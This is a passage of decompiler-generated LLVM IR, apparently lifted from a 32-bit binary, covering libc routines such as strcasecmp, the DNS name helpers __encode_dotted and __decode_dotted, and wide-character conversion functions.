  %v0_804eeca = phi i32 [ %v0_804ee86, %dec_label_pc_804ee84.dec_label_pc_804eeba_crit_edge ], [ %v0_804eeca.pre, %dec_label_pc_804ee8b ]
  %v1_804eec4 = phi i32 [ %arg3, %dec_label_pc_804ee84.dec_label_pc_804eeba_crit_edge ], [ %v1_804eec4.pre, %dec_label_pc_804ee8b ]
  %v4_804eeba = icmp eq i32 %arg2, 0
  %v3_804eec4 = select i1 %v4_804eeba, i32 0, i32 %v1_804eec4
  store i32 %v3_804eec4, i32* @edi, align 4
  %v5_804eeca = inttoptr i32 %v0_804eeca to i8*
  store i8* %v5_804eeca, i8** %stack_var_-108, align 4
  %v3_804eecb = call i32 @strlen(i8* %v5_804eeca)
  %v1_804eed3 = add i32 %v3_804eecb, 1
  store i32 %v1_804eed3, i32* %ebx.global-to-local, align 4
  %v1_804eed6 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804eed3, %v1_804eed6
  br i1 %tmp, label %dec_label_pc_804eeda, label %dec_label_pc_804eee1

dec_label_pc_804eeda:                             ; preds = %dec_label_pc_804eeba
  store i32 %v1_804eed6, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804eee1

dec_label_pc_804eee1:                             ; preds = %dec_label_pc_804eeba, %dec_label_pc_804eeda
  %v0_804eee6 = phi i32 [ %v1_804eed3, %dec_label_pc_804eeba ], [ %v1_804eed6, %dec_label_pc_804eeda ]
  %v1_804eee1 = icmp eq i32 %v0_804eee6, 0
  br i1 %v1_804eee1, label %dec_label_pc_804eefd, label %dec_label_pc_804eee5

dec_label_pc_804eee5:                             ; preds = %dec_label_pc_804eee1
  %v0_804eee7 = load i32, i32* @esi, align 4
  %v8_804eee8 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804eee8, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804eeec = call i32 @memcpy(i16* %tmp45, i32 %v0_804eee7, i32 %v0_804eee6)
  %v1_804eef8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eef8 = add i32 %arg2, -1
  %v3_804eef8 = add i32 %v2_804eef8, %v1_804eef8
  %v4_804eef8 = inttoptr i32 %v3_804eef8 to i8*
  store i8 0, i8* %v4_804eef8, align 1
  br label %dec_label_pc_804eefd

dec_label_pc_804eefd:                             ; preds = %dec_label_pc_804eee1, %dec_label_pc_804eee5
  %v0_804eefd = load i32, i32* @ebp, align 4
  %v1_804eefd = icmp eq i32 %v0_804eefd, 0
  br i1 %v1_804eefd, label %dec_label_pc_804ef08, label %dec_label_pc_804ef01

dec_label_pc_804ef01:                             ; preds = %dec_label_pc_804eefd
  %v0_804ef01 = load i8*, i8** %stack_var_-108, align 4
  %v1_804ef01 = ptrtoint i8* %v0_804ef01 to i32
  %v2_804ef01 = call i32 @__errno_location(i32 %v1_804ef01)
  %v0_804ef06 = load i32, i32* @ebp, align 4
  %v2_804ef06 = inttoptr i32 %v2_804ef01 to i32*
  store i32 %v0_804ef06, i32* %v2_804ef06, align 4
  %v0_804ef0b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804ef08

dec_label_pc_804ef08:                             ; preds = %dec_label_pc_804eefd, %dec_label_pc_804ef01
  %v0_804ef0b = phi i32 [ 0, %dec_label_pc_804eefd ], [ %v0_804ef0b.pre, %dec_label_pc_804ef01 ]
  ret i32 %v0_804ef0b

; uselistorder directives
  uselistorder i32 %v1_804eed6, { 1, 2, 0 }
  uselistorder i32 %v1_804eed3, { 1, 0, 2 }
  uselistorder i32 %v1_804ee7f, { 0, 2, 1 }
  uselistorder i32 %v3_804ee7c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 34, { 11, 2, 3, 4, 5, 6, 7, 8, 10, 12, 13, 9, 0, 1, 14, 15 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8050c60.124 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804ef08, { 1, 0 }
  uselistorder label %dec_label_pc_804eefd, { 1, 0 }
  uselistorder label %dec_label_pc_804eee1, { 1, 0 }
  uselistorder label %dec_label_pc_804eeba, { 1, 0 }
  uselistorder label %dec_label_pc_804ee79, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ef15 = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  %v4_804ef1e = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804ef26

dec_label_pc_804ef26:                             ; preds = %dec_label_pc_804ef43, %entry
  %storemerge = phi i32 [ %v4_804ef1e, %entry ], [ %v1_804ef44, %dec_label_pc_804ef43 ]
  %v0_804ef44 = phi i32 [ %v4_804ef1e, %entry ], [ %v1_804ef44, %dec_label_pc_804ef43 ]
  %v0_804ef496 = phi i32 [ 0, %entry ], [ %v0_804ef497, %dec_label_pc_804ef43 ]
  %v0_804ef43 = phi i32 [ %arg2, %entry ], [ %v1_804ef43, %dec_label_pc_804ef43 ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804ef26 = icmp eq i32 %v0_804ef44, %v0_804ef43
  %.pre = inttoptr i32 %v0_804ef44 to i8*
  br i1 %v12_804ef26, label %dec_label_pc_804ef3e, label %dec_label_pc_804ef2a

dec_label_pc_804ef2a:                             ; preds = %dec_label_pc_804ef26
  %v2_804ef2a = load i8, i8* %.pre, align 1
  %v3_804ef2a = zext i8 %v2_804ef2a to i32
  %v2_804ef2d = mul nuw nsw i32 %v3_804ef2a, 2
  %v3_804ef2d = add i32 %v2_804ef2d, %v0_804ef15
  %v4_804ef2d = inttoptr i32 %v3_804ef2d to i16*
  %v5_804ef2d = load i16, i16* %v4_804ef2d, align 2
  %v6_804ef2d = sext i16 %v5_804ef2d to i32
  %v1_804ef31 = inttoptr i32 %v0_804ef43 to i8*
  %v2_804ef31 = load i8, i8* %v1_804ef31, align 1
  %v3_804ef31 = zext i8 %v2_804ef31 to i32
  %v2_804ef34 = mul nuw nsw i32 %v3_804ef31, 2
  %v3_804ef34 = add i32 %v2_804ef34, %v0_804ef15
  %v4_804ef34 = inttoptr i32 %v3_804ef34 to i16*
  %v5_804ef34 = load i16, i16* %v4_804ef34, align 2
  %v6_804ef34 = sext i16 %v5_804ef34 to i32
  %v2_804ef38 = sub nsw i32 %v6_804ef2d, %v6_804ef34
  %v12_804ef38 = icmp eq i32 %v2_804ef38, 0
  store i32 %v2_804ef38, i32* @edx, align 4
  %v1_804ef3c = icmp eq i1 %v12_804ef38, false
  br i1 %v1_804ef3c, label %dec_label_pc_804ef47, label %dec_label_pc_804ef3e

dec_label_pc_804ef3e:                             ; preds = %dec_label_pc_804ef26, %dec_label_pc_804ef2a
  %v0_804ef497 = phi i32 [ %v2_804ef38, %dec_label_pc_804ef2a ], [ %v0_804ef496, %dec_label_pc_804ef26 ]
  %v2_804ef3e = load i8, i8* %.pre, align 1
  %v3_804ef3e = icmp eq i8 %v2_804ef3e, 0
  br i1 %v3_804ef3e, label %dec_label_pc_804ef47, label %dec_label_pc_804ef43

dec_label_pc_804ef43:                             ; preds = %dec_label_pc_804ef3e
  %v1_804ef43 = add i32 %v0_804ef43, 1
  %v1_804ef44 = add i32 %v0_804ef44, 1
  br label %dec_label_pc_804ef26

dec_label_pc_804ef47:                             ; preds = %dec_label_pc_804ef3e, %dec_label_pc_804ef2a
  %v0_804ef49 = phi i32 [ %v0_804ef497, %dec_label_pc_804ef3e ], [ %v2_804ef38, %dec_label_pc_804ef2a ]
  ret i32 %v0_804ef49

; uselistorder directives
  uselistorder i32 %v1_804ef44, { 1, 0 }
  uselistorder i32 %v0_804ef497, { 1, 0 }
  uselistorder i32 %v2_804ef38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ef43, { 1, 2, 0 }
  uselistorder i32 %v0_804ef44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef3e, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804ef4d = load i32, i32* @edi, align 4
  %v0_804ef4e = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804ef55 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ef55, i32* @edi, align 4
  %v1_804efb46 = icmp eq i8* %arg1, null
  br i1 %v1_804efb46, label %dec_label_pc_804efbd, label %dec_label_pc_804efb8.lr.ph

dec_label_pc_804efb8.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804efb8

dec_label_pc_804ef5b:                             ; preds = %dec_label_pc_804efb8
  %v5_804ef60 = call i32 @__GI_strchr(i8* %v1_804efb8, i32 46)
  %v1_804ef68 = icmp eq i32 %v5_804ef60, 0
  br i1 %v1_804ef68, label %dec_label_pc_804ef74, label %dec_label_pc_804ef6e

dec_label_pc_804ef6e:                             ; preds = %dec_label_pc_804ef5b
  %v1_804ef70 = load i32, i32* @edi, align 4
  %v2_804ef70 = sub i32 %v5_804ef60, %v1_804ef70
  br label %dec_label_pc_804ef82

dec_label_pc_804ef74:                             ; preds = %dec_label_pc_804ef5b
  %v0_804ef77 = load i32, i32* @edi, align 4
  %v5_804ef77 = inttoptr i32 %v0_804ef77 to i8*
  %v3_804ef78 = call i32 @strlen(i8* %v5_804ef77)
  br label %dec_label_pc_804ef82

dec_label_pc_804ef82:                             ; preds = %dec_label_pc_804ef6e, %dec_label_pc_804ef74
  %v0_804ef95 = phi i32 [ %v2_804ef70, %dec_label_pc_804ef6e ], [ %v3_804ef78, %dec_label_pc_804ef74 ]
  store i32 %v0_804ef95, i32* @esi, align 4
  %v1_804ef82 = icmp eq i32 %v0_804ef95, 0
  %v3_804ef82 = trunc i32 %v0_804ef95 to i8
  br i1 %v1_804ef82, label %dec_label_pc_804efd1, label %dec_label_pc_804ef86

dec_label_pc_804ef86:                             ; preds = %dec_label_pc_804ef82
  %v1_804ef8a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ef8a = sub i32 %arg3, %v1_804ef8a
  %v1_804ef8c = add i32 %v2_804ef8a, -1
  %v7_804ef8d = icmp ult i32 %v0_804ef95, %v1_804ef8c
  %v1_804ef8f = icmp eq i1 %v7_804ef8d, false
  br i1 %v1_804ef8f, label %dec_label_pc_804efd1, label %dec_label_pc_804ef91

dec_label_pc_804ef91:                             ; preds = %dec_label_pc_804ef86
  store i32 %arg2, i32* @edx, align 4
  %v4_804ef97 = add i32 %v1_804ef8a, %arg2
  %v5_804ef97 = inttoptr i32 %v4_804ef97 to i8*
  store i8 %v3_804ef82, i8* %v5_804ef97, align 1
  %v0_804ef9a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ef9a = add i32 %v0_804ef9a, 1
  %v0_804ef9c = load i32, i32* @edx, align 4
  %v0_804ef9e = load i32, i32* @esi, align 4
  %v2_804ef9f = add i32 %v1_804ef9a, %v0_804ef9c
  %v0_804efa1 = load i32, i32* @edi, align 4
  %v2_804efa2 = add i32 %v0_804ef9e, %v1_804ef9a
  store i32 %v2_804efa2, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_804ef9f to i16*
  %v7_804efa5 = call i32 @memcpy(i16* %tmp31, i32 %v0_804efa1, i32 %v0_804ef9e)
  %v1_804efb1 = add i32 %v5_804ef60, 1
  br i1 %v1_804ef68, label %dec_label_pc_804efbd, label %dec_label_pc_804efb4

dec_label_pc_804efb4:                             ; preds = %dec_label_pc_804ef91
  store i32 %v1_804efb1, i32* @edi, align 4
  %v1_804efb4 = icmp eq i32 %v1_804efb1, 0
  br i1 %v1_804efb4, label %dec_label_pc_804efbd, label %dec_label_pc_804efb8

dec_label_pc_804efb8:                             ; preds = %dec_label_pc_804efb8.lr.ph, %dec_label_pc_804efb4
  %v0_804ef5f = phi i32 [ %v4_804ef55, %dec_label_pc_804efb8.lr.ph ], [ %v1_804efb1, %dec_label_pc_804efb4 ]
  %v1_804efb8 = inttoptr i32 %v0_804ef5f to i8*
  %v2_804efb8 = load i8, i8* %v1_804efb8, align 1
  %v3_804efb8 = icmp eq i8 %v2_804efb8, 0
  %v1_804efbb = icmp eq i1 %v3_804efb8, false
  br i1 %v1_804efbb, label %dec_label_pc_804ef5b, label %dec_label_pc_804efbd

dec_label_pc_804efbd:                             ; preds = %dec_label_pc_804efb4, %dec_label_pc_804efb8, %dec_label_pc_804ef91, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_804efd1, label %dec_label_pc_804efc4

dec_label_pc_804efc4:                             ; preds = %dec_label_pc_804efbd
  %v1_804efc8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804efc8 = add i32 %v1_804efc8, %arg2
  %v3_804efc8 = inttoptr i32 %v2_804efc8 to i8*
  store i8 0, i8* %v3_804efc8, align 1
  %v0_804efcc = load i32, i32* %ebx.global-to-local, align 4
  %v1_804efcc = add i32 %v0_804efcc, 1
  br label %dec_label_pc_804efd4

dec_label_pc_804efd1:                             ; preds = %dec_label_pc_804ef86, %dec_label_pc_804ef82, %dec_label_pc_804efbd
  br label %dec_label_pc_804efd4

dec_label_pc_804efd4:                             ; preds = %dec_label_pc_804efc4, %dec_label_pc_804efd1
  %storemerge4 = phi i32 [ %v1_804efcc, %dec_label_pc_804efc4 ], [ -1, %dec_label_pc_804efd1 ]
  store i32 %v0_804ef4e, i32* @esi, align 4
  store i32 %v0_804ef4d, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_804efb8, { 1, 0 }
  uselistorder i32 %v1_804efb1, { 0, 2, 1 }
  uselistorder i32 %v0_804ef9e, { 1, 0 }
  uselistorder i32 %v5_804ef60, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 3, 7, 6, 0, 8, 5, 4, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804efd4, { 1, 0 }
  uselistorder label %dec_label_pc_804efd1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804efbd, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804efb8, { 1, 0 }
  uselistorder label %dec_label_pc_804ef82, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_804efde = load i32, i32* @esi, align 4
  %v4_804efe3 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_804efe3, label %dec_label_pc_804f0aa, label %dec_label_pc_804eff2

dec_label_pc_804eff2:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_804f0922541 = add i32 %arg2, %arg1
  %v3_804f0922642 = inttoptr i32 %v2_804f0922541 to i8*
  %v4_804f0922743 = load i8, i8* %v3_804f0922642, align 1
  %v1_804f0962945 = icmp eq i8 %v4_804f0922743, 0
  %v1_804f0983046 = icmp eq i1 %v1_804f0962945, false
  br i1 %v1_804f0983046, label %dec_label_pc_804f000.lr.ph, label %dec_label_pc_804f09e

dec_label_pc_804f000:                             ; preds = %dec_label_pc_804f000.lr.ph, %dec_label_pc_804f019
  %v0_804f00a = phi i32 [ %v0_804f00a.pre, %dec_label_pc_804f000.lr.ph ], [ %v4_804f02a, %dec_label_pc_804f019 ]
  %v8_804f00037 = phi i1 [ %v8_804f0003151, %dec_label_pc_804f000.lr.ph ], [ true, %dec_label_pc_804f019 ]
  %v5_804f09236.in = phi i8 [ %v5_804f0922850.in, %dec_label_pc_804f000.lr.ph ], [ %v4_804f092, %dec_label_pc_804f019 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_804f000.lr.ph ], [ 0, %dec_label_pc_804f019 ]
  %v0_804f00734 = phi i32 [ %v0_804f007.ph47, %dec_label_pc_804f000.lr.ph ], [ %v2_804f038, %dec_label_pc_804f019 ]
  %v5_804f09236 = zext i8 %v5_804f09236.in to i32
  %v1_804f007 = add i32 %v0_804f00734, 1
  store i32 %v1_804f007, i32* @esi, align 4
  %v3_804f00a = select i1 %v8_804f00037, i32 2, i32 1
  %v4_804f00a = add i32 %v3_804f00a, %v0_804f00a
  store i32 %v4_804f00a, i32* %ebp.global-to-local, align 4
  %v1_804f00d = and i32 %v5_804f09236, 192
  %v6_804f012 = icmp eq i32 %v1_804f00d, 192
  %v1_804f017 = icmp eq i1 %v6_804f012, false
  br i1 %v1_804f017, label %dec_label_pc_804f03c, label %dec_label_pc_804f019

dec_label_pc_804f019:                             ; preds = %dec_label_pc_804f000
  %v2_804f026 = add i32 %v1_804f007, %arg1
  %v3_804f026 = inttoptr i32 %v2_804f026 to i8*
  %v4_804f026 = load i8, i8* %v3_804f026, align 1
  %v5_804f026 = zext i8 %v4_804f026 to i32
  %v4_804f02a = add i32 %v3_804f00a, %v4_804f00a
  store i32 %v4_804f02a, i32* %ebp.global-to-local, align 4
  %v1_804f02d = mul nuw nsw i32 %v5_804f09236, 256
  %v2_804f030 = and i32 %v1_804f02d, 16128
  %v2_804f038 = or i32 %v5_804f026, %v2_804f030
  store i32 %v2_804f038, i32* @edx, align 4
  store i32 %v1_804f059.ph48, i32* @ecx, align 4
  %v2_804f092 = add i32 %v2_804f038, %arg1
  %v3_804f092 = inttoptr i32 %v2_804f092 to i8*
  %v4_804f092 = load i8, i8* %v3_804f092, align 1
  %v1_804f096 = icmp eq i8 %v4_804f092, 0
  %v1_804f098 = icmp eq i1 %v1_804f096, false
  br i1 %v1_804f098, label %dec_label_pc_804f000, label %dec_label_pc_804f09e

dec_label_pc_804f03c:                             ; preds = %dec_label_pc_804f000
  %v2_804f03c = add i32 %v5_804f09236, %v1_804f059.ph48
  %v1_804f041 = add i32 %v2_804f03c, 1
  store i32 %v1_804f041, i32* @edi, align 4
  %v10_804f042 = icmp ult i32 %v1_804f041, %arg4
  %v1_804f04a = icmp eq i1 %v10_804f042, false
  br i1 %v1_804f04a, label %dec_label_pc_804f0aa, label %dec_label_pc_804f04c

dec_label_pc_804f04c:                             ; preds = %dec_label_pc_804f03c
  %v2_804f052 = add i32 %v1_804f007, %arg1
  %v2_804f059 = add i32 %v1_804f059.ph48, %arg3
  %v3_804f05c = inttoptr i32 %v2_804f059 to i16*
  %v4_804f05c = call i32 @memcpy(i16* %v3_804f05c, i32 %v2_804f052, i32 %v5_804f09236)
  %v0_804f068 = load i32, i32* %ebp.global-to-local, align 4
  %v0_804f071 = load i32, i32* @esi, align 4
  %v2_804f071 = add i32 %v0_804f071, %v5_804f09236
  store i32 %v2_804f071, i32* @edx, align 4
  %v1_804f078 = icmp eq i1 %v8_804f00037, false
  %v2_804f068 = select i1 %v1_804f078, i32 %v5_804f09236, i32 0
  %v4_804f078 = add i32 %v0_804f068, %v2_804f068
  store i32 %v4_804f078, i32* %ebp.global-to-local, align 4
  %v4_804f089 = add i32 %v2_804f03c, %arg3
  %v5_804f089 = inttoptr i32 %v4_804f089 to i8*
  store i8 46, i8* %v5_804f089, align 1
  %v0_804f08c.pre = load i32, i32* @edi, align 4
  %v1_804f092.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_804f08c.pre, i32* @ecx, align 4
  %v2_804f09225 = add i32 %v1_804f092.pre.pre, %arg1
  %v3_804f09226 = inttoptr i32 %v2_804f09225 to i8*
  %v4_804f09227 = load i8, i8* %v3_804f09226, align 1
  %v1_804f09629 = icmp eq i8 %v4_804f09227, 0
  %v1_804f09830 = icmp eq i1 %v1_804f09629, false
  %v8_804f00031 = icmp eq i8 %stack_var_-17.135, 0
  %v0_804f00a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_804f09830, label %dec_label_pc_804f000.lr.ph, label %dec_label_pc_804f09e

dec_label_pc_804f000.lr.ph:                       ; preds = %dec_label_pc_804f04c, %dec_label_pc_804eff2
  %v0_804f00a.pre = phi i32 [ 0, %dec_label_pc_804eff2 ], [ %v0_804f00a.pre.pre, %dec_label_pc_804f04c ]
  %v8_804f0003151 = phi i1 [ false, %dec_label_pc_804eff2 ], [ %v8_804f00031, %dec_label_pc_804f04c ]
  %v5_804f0922850.in = phi i8 [ %v4_804f0922743, %dec_label_pc_804eff2 ], [ %v4_804f09227, %dec_label_pc_804f04c ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_804eff2 ], [ %stack_var_-17.135, %dec_label_pc_804f04c ]
  %v1_804f059.ph48 = phi i32 [ 0, %dec_label_pc_804eff2 ], [ %v0_804f08c.pre, %dec_label_pc_804f04c ]
  %v0_804f007.ph47 = phi i32 [ %arg2, %dec_label_pc_804eff2 ], [ %v1_804f092.pre.pre, %dec_label_pc_804f04c ]
  br label %dec_label_pc_804f000

dec_label_pc_804f09e:                             ; preds = %dec_label_pc_804f04c, %dec_label_pc_804f019, %dec_label_pc_804eff2
  %v0_804f0a3 = phi i32 [ 0, %dec_label_pc_804eff2 ], [ %v4_804f02a, %dec_label_pc_804f019 ], [ %v0_804f00a.pre.pre, %dec_label_pc_804f04c ]
  %v8_804f000.lcssa = phi i1 [ false, %dec_label_pc_804eff2 ], [ true, %dec_label_pc_804f019 ], [ %v8_804f00031, %dec_label_pc_804f04c ]
  %v2_804f0a5 = zext i1 %v8_804f000.lcssa to i32
  %v3_804f0a5 = add i32 %v0_804f0a3, 1
  %v4_804f0a5 = add i32 %v3_804f0a5, %v2_804f0a5
  br label %dec_label_pc_804f0ad

dec_label_pc_804f0aa:                             ; preds = %dec_label_pc_804f03c, %entry
  br label %dec_label_pc_804f0ad

dec_label_pc_804f0ad:                             ; preds = %dec_label_pc_804f09e, %dec_label_pc_804f0aa
  %storemerge = phi i32 [ %v4_804f0a5, %dec_label_pc_804f09e ], [ -1, %dec_label_pc_804f0aa ]
  store i32 %v0_804efde, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f059.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_804f092, { 1, 0 }
  uselistorder i32 %v2_804f038, { 0, 2, 1 }
  uselistorder i32 %v4_804f02a, { 0, 2, 1 }
  uselistorder i32 %v5_804f09236, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 5, 6, 8, 3, 0, 7, 1, 4 }
  uselistorder i8 46, { 4, 0, 5, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_804f0ad, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804f0c6 = icmp eq i32 %arg1, 0
  br i1 %v1_804f0c6, label %dec_label_pc_804f0f5, label %dec_label_pc_804f0e6.preheader

dec_label_pc_804f0e6.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_804f0e610 = add i32 %arg2, %arg1
  %v3_804f0e611 = inttoptr i32 %v2_804f0e610 to i8*
  %v4_804f0e612 = load i8, i8* %v3_804f0e611, align 1
  %v1_804f0ea14 = add i32 %arg2, 1
  %v1_804f0ed15 = icmp eq i8 %v4_804f0e612, 0
  %v1_804f0ef16 = icmp eq i1 %v1_804f0ed15, false
  br i1 %v1_804f0ef16, label %dec_label_pc_804f0d5, label %dec_label_pc_804f0f1

dec_label_pc_804f0cc:                             ; preds = %dec_label_pc_804f0d5
  %v1_804f0cc = add i32 %v0_804f0cc17, 2
  br label %dec_label_pc_804f0f1

dec_label_pc_804f0d5:                             ; preds = %dec_label_pc_804f0e6.preheader, %dec_label_pc_804f0e6
  %v1_804f0ea19 = phi i32 [ %v1_804f0ea, %dec_label_pc_804f0e6 ], [ %v1_804f0ea14, %dec_label_pc_804f0e6.preheader ]
  %v5_804f0e618.in = phi i8 [ %v4_804f0e6, %dec_label_pc_804f0e6 ], [ %v4_804f0e612, %dec_label_pc_804f0e6.preheader ]
  %v0_804f0cc17 = phi i32 [ %v2_804f0e3, %dec_label_pc_804f0e6 ], [ %arg2, %dec_label_pc_804f0e6.preheader ]
  %v5_804f0e618 = zext i8 %v5_804f0e618.in to i32
  %v1_804f0d7 = and i32 %v5_804f0e618, 192
  %v6_804f0dc = icmp eq i32 %v1_804f0d7, 192
  %v2_804f0e3 = add i32 %v5_804f0e618, %v1_804f0ea19
  br i1 %v6_804f0dc, label %dec_label_pc_804f0cc, label %dec_label_pc_804f0e6

dec_label_pc_804f0e6:                             ; preds = %dec_label_pc_804f0d5
  store i32 %v2_804f0e3, i32* @ecx, align 4
  %v2_804f0e6 = add i32 %v2_804f0e3, %arg1
  %v3_804f0e6 = inttoptr i32 %v2_804f0e6 to i8*
  %v4_804f0e6 = load i8, i8* %v3_804f0e6, align 1
  %v1_804f0ea = add i32 %v2_804f0e3, 1
  %v1_804f0ed = icmp eq i8 %v4_804f0e6, 0
  %v1_804f0ef = icmp eq i1 %v1_804f0ed, false
  br i1 %v1_804f0ef, label %dec_label_pc_804f0d5, label %dec_label_pc_804f0f1

dec_label_pc_804f0f1:                             ; preds = %dec_label_pc_804f0e6.preheader, %dec_label_pc_804f0e6, %dec_label_pc_804f0cc
  %v0_804f0f1 = phi i32 [ %v1_804f0cc, %dec_label_pc_804f0cc ], [ %v1_804f0ea14, %dec_label_pc_804f0e6.preheader ], [ %v1_804f0ea, %dec_label_pc_804f0e6 ]
  %v2_804f0f3 = sub i32 %v0_804f0f1, %arg2
  br label %dec_label_pc_804f0f5

dec_label_pc_804f0f5:                             ; preds = %entry, %dec_label_pc_804f0f1
  %v0_804f0f8 = phi i32 [ -1, %entry ], [ %v2_804f0f3, %dec_label_pc_804f0f1 ]
  ret i32 %v0_804f0f8

; uselistorder directives
  uselistorder i8 %v4_804f0e6, { 1, 0 }
  uselistorder i32 %v2_804f0e3, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f0f5, { 1, 0 }
  uselistorder label %dec_label_pc_804f0f1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f0d5, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804f107 = icmp eq i32 %tmp4, 0
  %v1_804f109 = icmp eq i1 %v1_804f107, false
  br i1 %v1_804f109, label %dec_label_pc_804f111, label %dec_label_pc_804f10b

dec_label_pc_804f10b:                             ; preds = %entry
  %v2_804f10b = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804f111

dec_label_pc_804f111:                             ; preds = %entry, %dec_label_pc_804f10b
  %v0_804f12d = phi i32 [ %tmp4, %entry ], [ %v2_804f10b, %dec_label_pc_804f10b ]
  %v0_804f119 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_804f10b ]
  %v2_804f111 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_804f111, i32* %stack_var_-8, align 4
  store i32 %v0_804f119, i32* %stack_var_-4, align 4
  %v2_804f128 = ptrtoint i32* %stack_var_-8 to i32
  %v5_804f12e = inttoptr i32 %v0_804f12d to i8*
  %v6_804f12e = call i32 @__GI_wcsnrtombs(i8* %v5_804f12e, i32 %v2_804f128, i32 1, i32 16, i32 %tmp)
  %v1_804f138 = icmp eq i32 %v6_804f12e, 0
  %v3_804f13a = select i1 %v1_804f138, i32 1, i32 %v6_804f12e
  ret i32 %v3_804f13a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804f111, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804f159 = inttoptr i32 %tmp to i8*
  %v6_804f159 = call i32 @__GI_wcsnrtombs(i8* %v5_804f159, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804f159
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_804f167 = load i32, i32* @ebx, align 4
  %v4_804f16b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f16b, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
